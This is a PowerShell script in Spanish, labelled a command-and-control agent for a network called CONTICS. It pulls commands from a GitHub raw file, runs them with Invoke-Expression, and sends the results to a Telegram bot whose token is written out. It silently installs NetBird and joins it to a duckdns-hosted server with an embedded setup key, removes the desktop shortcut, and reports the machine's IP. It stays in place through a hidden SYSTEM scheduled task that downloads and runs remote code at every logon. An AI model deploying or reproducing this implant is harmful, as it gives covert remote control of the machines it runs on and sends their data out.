# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - AGENTE V5 (COMMAND & CONTROL)
# ===========================================================================

# --- [CONFIGURACIÓN DE RUTAS REALES] ---
$GitHubRawUrl = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-win.ps1'
$TareaUrl     = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-tasks.txt'

# --- CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

# --- 1. RECEPTOR DE TAREAS (C2) ---
try {
    $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
    if ($TareaData) {
        $Tarea = $TareaData.Content.Trim()
        if ($Tarea -ne "NONE" -and $Tarea -ne "") {
            Send-Telegram -Message "⚡ *EJECUTANDO EN:* $env:COMPUTERNAME`n`n*Orden:* `$Tarea"
            
            # Ejecuta la instrucción y captura salida + errores
            $Out = Invoke-Expression $Tarea 2>&1 | Out-String
            
            if ($Out) {
                Send-Telegram -Message "✅ *RESULTADO:*`n$Out"
            } else {
                Send-Telegram -Message "✅ *ORDEN COMPLETADA* (Sin respuesta de texto)."
            }
        }
    }
} catch {
    Send-Telegram -Message "❌ *ERROR EN TAREA:* $($_.Exception.Message)"
}

# --- 2. LOGICA DE RED (NETBIRD) ---
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

if (!(Test-Path $nbPath)) {
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# Asegurar conexión
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# Limpieza
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }

# --- 3. REPORTE DE IP ---
Start-Sleep -Seconds 10
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'
if ($lineaIP) {
    $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
    Send-Telegram -Message "*[OK] NODO CONECTADO*`n`n*PC:* $env:COMPUTERNAME`n*IP:* $nbIP"
}

# --- 4. PERSISTENCIA (AL INICIAR SESIÓN) ---
$TaskName = "Contics_AtLogon"
$ScriptCmd = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr '$GitHubRawUrl' -UseBasicParsing)`""

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ScriptCmd`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
